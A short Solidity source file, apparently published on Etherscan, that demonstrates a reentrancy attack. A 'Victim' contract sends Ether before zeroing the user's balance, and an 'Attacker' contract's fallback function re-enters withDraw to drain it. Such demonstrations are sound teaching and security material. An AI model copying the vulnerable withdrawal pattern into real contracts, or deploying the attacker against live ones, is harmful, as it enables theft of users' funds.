/**
 *Submitted for verification at Etherscan.io on 2021-11-26
*/

pragma solidity ^0.4.19;

contract Victim {
    mapping(address => uint) public userBalannce;
    uint public amount = 0;
    function Victim() payable{}
    function withDraw(){
        uint amount = userBalannce[msg.sender];
        if(amount > 0){
            msg.sender.call.value(amount)();
            userBalannce[msg.sender] = 0;
        }
    }
    function() payable{}
    function receiveEther() payable{
        if(msg.value > 0){
            userBalannce[msg.sender] += msg.value;
        }
    }
     function showAccount() public returns (uint){
        amount = this.balance;
        return this.balance;
    }
}

contract Attacker{
    uint public amount = 0;
    uint public test = 0;
    function Attacker() payable{}
    function() payable{
        test++;
        Victim(msg.sender).withDraw();
    }
    function showAccount() public returns (uint){
        amount = this.balance;
        return this.balance;
    }
    function sendMoney(address addr){
        Victim(addr).receiveEther.value(1 ether)();
    }
    function reentry(address addr){
        Victim(addr).withDraw();
    }
}